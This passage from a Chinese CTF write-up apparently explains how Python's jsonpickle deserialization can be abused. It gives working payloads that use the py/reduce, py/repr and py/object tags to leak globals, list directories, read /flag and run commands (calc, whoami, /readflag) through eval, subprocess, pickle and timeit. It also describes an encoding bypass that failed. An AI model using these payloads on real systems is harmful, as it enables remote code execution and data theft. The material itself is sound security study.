+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化一个模块</span></span><br><span class="line">serialized_module = jsonpickle.encode(os)</span><br><span class="line"><span class="built_in">print</span>(serialized_module)</span><br></pre></td></tr></table></figure>
+<p>输出</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/mod&quot;</span><span class="punctuation">:</span> <span class="string">&quot;os&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="全局信息泄露"><a class="markdownIt-Anchor" href="#全局信息泄露"></a> 全局信息泄露</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">到此，我们可以利用这三个标签来泄露目标程序的一些全局信息</span><br><span class="line">&#123;&quot;py/mod&quot;: &quot;__main__/x.__dict__&quot;&#125;</span><br><span class="line">&#123;&quot;py/function&quot;: &quot;__main__.__dict__&quot;&#125;</span><br><span class="line">&#123;&quot;py/type&quot;: &quot;__main__.__dict__&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251007181006214.png" alt="image-20251007181006214" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002428F483230&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;E:\\ctf做题脚本\\web\\1.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;jsonpickle&#x27;: &lt;module &#x27;jsonpickle&#x27; from &#x27;D:\\Python3\\Lib\\site-packages\\jsonpickle\\__init__.py&#x27;&gt;, &#x27;User&#x27;: &lt;class &#x27;__main__.User&#x27;&gt;, &#x27;user_obj&#x27;: &lt;__main__.User object at 0x00000242AF5F2210&gt;, &#x27;json&#x27;: &#x27;&#123;&quot;py/function&quot;: &quot;__main__.__dict__&quot;&#125;&#x27;, &#x27;serialized&#x27;: &#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="pyrepr"><a class="markdownIt-Anchor" href="#pyrepr"></a> py/repr</h3>
+<p><code>jsonpickle</code>默认开启<code>safe</code>，<code>_restore_repr_safe</code>是调的<code>_loadmodule</code>，实际上也<strong>不能利用这个标签</strong></p>
+<p><code>py/repr</code> 用于序列化那些可以通过 <code>repr()</code> 函数准确表示，并且可以通过 <code>eval()</code> 函数重建的对象。它本质上是一种&quot;代码序列化&quot;方式。</p>
+<p><strong>基本思想</strong>：将对象的 <code>repr()</code> 输出序列化，反序列化时通过 <code>eval()</code> 重建对象。</p>
+<p><code>py/repr</code> 的核心机制就是 <code>eval()</code>，这本身就意味着任意代码执行：</p>
+<p>导入<code>/</code>左边的模块作为locals，<code>/</code>右边的作为<code>eval</code>的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp=&#123;<span class="string">&#x27;py/repr&#x27;</span>: <span class="string">&#x27;os/os.system(&quot;calc&quot;)&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#&#123;&quot;py/repr&quot;: &quot;__import__(\&quot;os\&quot;).system(\&quot;calc.exe\&quot;)&quot;&#125;</span></span><br><span class="line">jsonpickle.decode(exp, safe=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251007181524900.png" alt="image-20251007181524900" /></p>
+<h3 id="pyreduce"><a class="markdownIt-Anchor" href="#pyreduce"></a> py/reduce</h3>
+<p><code>py/reduce</code> 实现了 Python 的 <strong>Pickle 协议</strong>，它允许对象自定义自己的序列化和反序列化行为。通过 <code>__reduce__</code> 或 <code>__reduce_ex__</code> 方法，对象可以完全控制如何被重建。</p>
+<p><strong>核心思想</strong>：对象告诉反序列化器：“调用这个可调用对象，传入这些参数，就能重建我”。</p>
+<p><code>__reduce__</code>返回一个元组用于恢复对象，这个元组的长度可为2~5，后三个元素为可选。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回一个元组：(callable, args)</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.__class__, (<span class="variable language_">self</span>.value,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化和反序列化</span></span><br><span class="line">obj = Example(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">serialized = pickle.dumps(obj)</span><br><span class="line">deserialized = pickle.loads(serialized)  <span class="comment"># 会调用 Example(&quot;hello&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#__reduce__ 返回的元组格式：(callable, args, state, listitems, dictitems)</span></span><br></pre></td></tr></table></figure>
+<p>第一个元素为可调用的对象，用于重建对象时调用；第二个元素为参数元组，用于传入可调用对象。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;py/reduce&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    callable_info<span class="punctuation">,</span>    <span class="comment">// 可调用对象（函数、类等）</span></span><br><span class="line">    args_info<span class="punctuation">,</span>        <span class="comment">// 参数（元组）</span></span><br><span class="line">    state_info<span class="punctuation">,</span>       <span class="comment">// 状态（可选）</span></span><br><span class="line">    listitems_info<span class="punctuation">,</span>   <span class="comment">// 列表项（可选）</span></span><br><span class="line">    dictitems_info    <span class="comment">// 字典项（可选）</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>使用实例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (Person, (<span class="variable language_">self</span>.name, <span class="variable language_">self</span>.age))</span><br><span class="line"></span><br><span class="line">person = Person(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>)</span><br><span class="line">serialized = jsonpickle.encode(person)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;py/reduce&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;py/type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__main__.Person&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;py/tuple&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;Alice&quot;</span><span class="punctuation">,</span> <span class="number">25</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>恶意payload构造：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;py/reduce&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span>&#x27;py/function&#x27;<span class="punctuation">:</span> &#x27;builtins.eval&#x27;<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span>&#x27;py/tuple&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251007184725258.png" alt="image-20251007184725258" /></p>
+<h3 id="pyobject"><a class="markdownIt-Anchor" href="#pyobject"></a> py/object</h3>
+<p><code>py/object</code> 是 <code>jsonpickle</code> 用于序列化<strong>自定义类实例</strong>的主要标签。它的作用是告诉反序列化器：“这个JSON数据原本是一个Python对象，需要重建为指定类的实例”。</p>
+<p><strong>核心功能</strong>：将JSON数据转换回特定类的对象实例。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, email</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.email = email</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建对象并序列化</span></span><br><span class="line">user = User(<span class="string">&quot;alice&quot;</span>, <span class="string">&quot;alice@example.com&quot;</span>)</span><br><span class="line">serialized = jsonpickle.encode(user)</span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line"><span class="comment">#输出：</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__main__.User&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;alice&quot;</span>,</span><br><span class="line">  <span class="string">&quot;email&quot;</span>: <span class="string">&quot;alice@example.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong>：方法不会被序列化，只有实例属性会被保存。</p>
+<p>反序列化流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 对于: &#123;&quot;py/object&quot;: &quot;__main__.User&quot;, &quot;username&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@example.com&quot;&#125;</span><br><span class="line"># 反序列化时：</span><br><span class="line"># 1. 加载 User 类</span><br><span class="line"># 2. 创建 User 实例：user = User.__new__(User)</span><br><span class="line"># 3. 设置属性：user.username = &quot;alice&quot;, user.email = &quot;alice@example.com&quot;</span><br><span class="line"># 4. 返回 user 对象</span><br></pre></td></tr></table></figure>
+<h3 id="可利用payload"><a class="markdownIt-Anchor" href="#可利用payload"></a> 可利用payload</h3>
+<p><strong>利用函数也是对象的特性：</strong></p>
+<p><code>py/newargs</code>指定调用时的参数</p>
+<p>列目录：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;glob.glob&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;<span class="comment">/*&#x27;&#125;&#125;</span></span><br><span class="line"><span class="comment">&#123;&#x27;py/object&#x27;: &#x27;os.listdir&#x27;, &#x27;py/newargs&#x27;: [&#x27;/&#x27;]&#125;</span></span><br></pre></td></tr></table></figure>
+<p>读文件：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;linecache.getlines&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;/flag&#x27;<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>RCE：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;subprocess.run&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;calc&#x27;<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;subprocess.getoutput&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;calc&#x27;<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;pickle.loads&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span>&#x27;py/b64&#x27;<span class="punctuation">:</span>&#x27;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJjYWxjIicKby4=&#x27;<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;timeit.main&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">[</span>&#x27;-r&#x27;<span class="punctuation">,</span> &#x27;<span class="number">1</span>&#x27;<span class="punctuation">,</span> &#x27;-n&#x27;<span class="punctuation">,</span> &#x27;<span class="number">1</span>&#x27;<span class="punctuation">,</span> &#x27;__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;calc&quot;</span>)&#x27;<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;uuid._get_command_stdout&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;calc&#x27;<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span>&#x27;py/object&#x27;<span class="punctuation">:</span> &#x27;pydoc.pipepager&#x27;<span class="punctuation">,</span> &#x27;py/newargs&#x27;<span class="punctuation">:</span> <span class="punctuation">[</span>&#x27;a&#x27;<span class="punctuation">,</span> &#x27;calc&#x27;<span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span><span class="string">&quot;nt.system&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargsex&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="attr">&quot;py/set&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;whoami&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="string">&quot;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//__reduce__ 方法返回的第二个元素必须是一个元组</span></span><br><span class="line"><span class="comment">//type标签也可以加载类直接返回</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/reduce&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nt.system&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;py/tuple&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;whoami&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span> <span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span><span class="string">&quot;builtins.bytes&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;builtins.map&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;py/newargs&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/function&quot;</span><span class="punctuation">:</span> <span class="string">&quot;builtins.exec&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">[</span><span class="string">&quot;print(123)&quot;</span><span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.bytes&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;py/object&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.map&quot;</span><span class="punctuation">,</span><span class="attr">&quot;py/newargs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;py/function&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__builtin__.eval&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">[</span>f<span class="string">&quot;exec(&#x27;import os;os.system(&#x27;/readflag&gt;/app/flag5.txt&#x27;)&#x27;)&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="punctuation">&#125;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="pynewargsex和pynewargs"><a class="markdownIt-Anchor" href="#pynewargsex和pynewargs"></a> py/newargsex和py/newargs</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">标签</th>
+<th style="text-align:left">作用</th>
+<th style="text-align:left">Python对应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong><code>py/newargs</code></strong></td>
+<td style="text-align:left">普通参数传递</td>
+<td style="text-align:left"><code>__init__(*args)</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><strong><code>py/newargsex</code></strong></td>
+<td style="text-align:left">扩展参数传递（含关键字参数）</td>
+<td style="text-align:left"><code>__init__(*args, **kwargs)</code></td>
+</tr>
+</tbody>
+</table>
+<p>普通参数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;ClassName&quot;</span>,</span><br><span class="line">  <span class="string">&quot;py/newargs&quot;</span>: [<span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg2&quot;</span>, <span class="string">&quot;arg3&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 相当于执行：</span></span><br><span class="line">instance = ClassName(<span class="string">&quot;arg1&quot;</span>, <span class="string">&quot;arg2&quot;</span>, <span class="string">&quot;arg3&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>扩展参数:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;ClassName&quot;</span>, </span><br><span class="line">  <span class="string">&quot;py/newargsex&quot;</span>: [</span><br><span class="line">    [<span class="string">&quot;pos_arg1&quot;</span>, <span class="string">&quot;pos_arg2&quot;</span>],  // 位置参数列表</span><br><span class="line">    &#123;<span class="string">&quot;kwarg1&quot;</span>: <span class="string">&quot;value1&quot;</span>, <span class="string">&quot;kwarg2&quot;</span>: <span class="string">&quot;value2&quot;</span>&#125;  // 关键字参数字典</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相当于执行：</span></span><br><span class="line">instance = ClassName(<span class="string">&quot;pos_arg1&quot;</span>, <span class="string">&quot;pos_arg2&quot;</span>, kwarg1=<span class="string">&quot;value1&quot;</span>, kwarg2=<span class="string">&quot;value2&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="编码绕过失败"><a class="markdownIt-Anchor" href="#编码绕过失败"></a> 编码绕过(失败)</h2>
+<p><code>json</code>作为默认的JSON后端，<code>loads</code>不仅支持str也支持bytes</p>
+<p>由于是灰盒题，无法判断传入<code>jsonpickle#decode</code>的是str还是bytes</p>
+<p>如下为<code>json.loads</code>源码，若s为字符串，碰到<code>\ufeff</code>开头会报错</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;\ufeff&#x27;</span>):</span><br><span class="line">        <span class="keyword">raise</span> JSONDecodeError(<span class="string">&quot;Unexpected UTF-8 BOM (decode using utf-8-sig)&quot;</span>,</span><br><span class="line">                              s, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(s, (<span class="built_in">bytes</span>, <span class="built_in">bytearray</span>)):</span><br><span class="line">       <span class="keyword">raise</span> TypeError(<span class="string">f&#x27;the JSON object must be str, bytes or bytearray, &#x27;</span></span><br><span class="line">                            <span class="string">f&#x27;not <span class="subst">&#123;s.__class__.__name__&#125;</span>&#x27;</span>)</span><br><span class="line">     s = s.decode(detect_encoding(s), <span class="string">&#x27;surrogatepass&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>如果是bytes就可以用编码绕过，具体是支持如下编码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">detect_encoding</span>(<span class="params">b</span>):</span><br><span class="line">    bstartswith = b.startswith</span><br><span class="line">    <span class="keyword">if</span> bstartswith((codecs.BOM_UTF32_BE, codecs.BOM_UTF32_LE)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;utf-32&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> bstartswith((codecs.BOM_UTF16_BE, codecs.BOM_UTF16_LE)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;utf-16&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> bstartswith(codecs.BOM_UTF8):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;utf-8-sig&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># 00 00 -- -- - utf-32-be</span></span><br><span class="line">            <span class="comment"># 00 XX -- -- - utf-16-be</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;utf-16-be&#x27;</span> <span class="keyword">if</span> b[<span class="number">1</span>] <span class="keyword">else</span> <span class="string">&#x27;utf-32-be&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># XX 00 00 00 - utf-32-le</span></span><br><span class="line">            <span class="comment"># XX 00 00 XX - utf-16-le</span></span><br><span class="line">            <span class="comment"># XX 00 XX -- - utf-16-le</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;utf-16-le&#x27;</span> <span class="keyword">if</span> b[<span class="number">2</span>] <span class="keyword">or</span> b[<span class="number">3</span>] <span class="keyword">else</span> <span class="string">&#x27;utf-32-le&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(b) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># 00 XX - utf-16-be</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;utf-16-be&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> b[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment"># XX 00 - utf-16-le</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;utf-16-le&#x27;</span></span><br><span class="line">    <span class="comment"># default</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;utf-8&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>下面以<code>utf-32-be</code>为例</p>
